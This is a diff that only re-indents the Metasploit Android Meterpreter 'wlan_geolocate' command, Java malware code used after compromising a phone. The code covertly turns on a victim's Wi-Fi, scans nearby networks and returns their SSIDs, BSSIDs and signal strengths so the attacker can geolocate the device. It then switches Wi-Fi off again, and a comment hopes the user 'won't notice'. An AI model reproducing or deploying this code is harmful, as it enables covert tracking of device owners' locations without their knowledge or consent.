@@ -1,4 +1,4 @@
- package com.metasploit.meterpreter.android;
+package com.metasploit.meterpreter.android;
 
 import java.util.List;
 
@@ -33,26 +33,22 @@ public class wlan_geolocate implements Command {
     private static final int TLV_TYPE_WLAN_LEVEL = TLVPacket.TLV_META_TYPE_UINT
             | (TLV_EXTENSIONS + 9025);
 
-	WifiManager mainWifi;
-	WifiReceiver receiverWifi;
-	List<ScanResult> wifiList;
-	Object scanready = new Object();
-	boolean WifiStatus;
+    WifiManager mainWifi;
+    WifiReceiver receiverWifi;
+    List<ScanResult> wifiList;
+    Object scanready = new Object();
+    boolean WifiStatus;
 
-        class WifiReceiver extends BroadcastReceiver {
+    class WifiReceiver extends BroadcastReceiver {
 
-	    @Override
-            public void onReceive(Context c, Intent intent) {
-
-		synchronized (scanready){
-	                wifiList = mainWifi.getScanResults();
-		    scanready.notifyAll();
-		}
-
-
+        @Override
+        public void onReceive(Context c, Intent intent) {
+            synchronized (scanready) {
+                wifiList = mainWifi.getScanResults();
+                scanready.notifyAll();
             }
-
         }
+    }
 
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
@@ -60,41 +56,44 @@ public class wlan_geolocate implements Command {
         AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
         final Context context = androidMeterpreter.getContext();
 
-         mainWifi = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
-	 WifiStatus=mainWifi.isWifiEnabled();
-         if (WifiStatus == false)
-         {
-             // If wifi is disabled, enable it
-             mainWifi.setWifiEnabled(true);
-         }
+        mainWifi = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
+        WifiStatus=mainWifi.isWifiEnabled();
+        if (WifiStatus == false) {
+            // If wifi is disabled, enable it
+            mainWifi.setWifiEnabled(true);
+        }
 
-         receiverWifi = new WifiReceiver();
-         context.registerReceiver(receiverWifi, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
-         mainWifi.startScan();
+        receiverWifi = new WifiReceiver();
+        context.registerReceiver(receiverWifi,
+            new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
+        mainWifi.startScan();
 
-	 wifiList=null;
-	 synchronized (scanready){
-	       	scanready.wait(30000);
-		//If wifi was disabled when process started, turn it off again
-		//hopefully fast-enough that user won't notice =)
-		if (WifiStatus == false){
-			mainWifi.setWifiEnabled(false);
-		}
-		if (wifiList.size()==0){
-			return ERROR_FAILURE;
-		}
-		for(int i = 0; i < wifiList.size(); i++){
-			TLVPacket pckt=new TLVPacket();
-			pckt.addOverflow(TLV_TYPE_WLAN_SSID,wifiList.get(i).SSID);
-			pckt.addOverflow(TLV_TYPE_WLAN_BSSID,wifiList.get(i).BSSID);
-			int level=0;
-			level = mainWifi.calculateSignalLevel(wifiList.get(i).level,100);
-			pckt.addOverflow(TLV_TYPE_WLAN_LEVEL,level);
-			response.addOverflow(TLV_TYPE_WLAN_GROUP, pckt);
-		}
-	}
+        wifiList=null;
+        synchronized (scanready) {
+            scanready.wait(30000);
 
-	return ERROR_SUCCESS;
+            // If wifi was disabled when process started, turn it off again
+            // hopefully fast-enough that user won't notice =)
+            if (WifiStatus == false) {
+                mainWifi.setWifiEnabled(false);
+            }
+
+            if (wifiList.size()==0) {
+                return ERROR_FAILURE;
+            }
+
+            for (int i = 0; i < wifiList.size(); i++) {
+                TLVPacket pckt=new TLVPacket();
+                pckt.addOverflow(TLV_TYPE_WLAN_SSID,wifiList.get(i).SSID);
+                pckt.addOverflow(TLV_TYPE_WLAN_BSSID,wifiList.get(i).BSSID);
+                int level=0;
+                level = mainWifi.calculateSignalLevel(wifiList.get(i).level,100);
+                pckt.addOverflow(TLV_TYPE_WLAN_LEVEL,level);
+                response.addOverflow(TLV_TYPE_WLAN_GROUP, pckt);
+            }
+        }
+
+        return ERROR_SUCCESS;
     }
 }
 
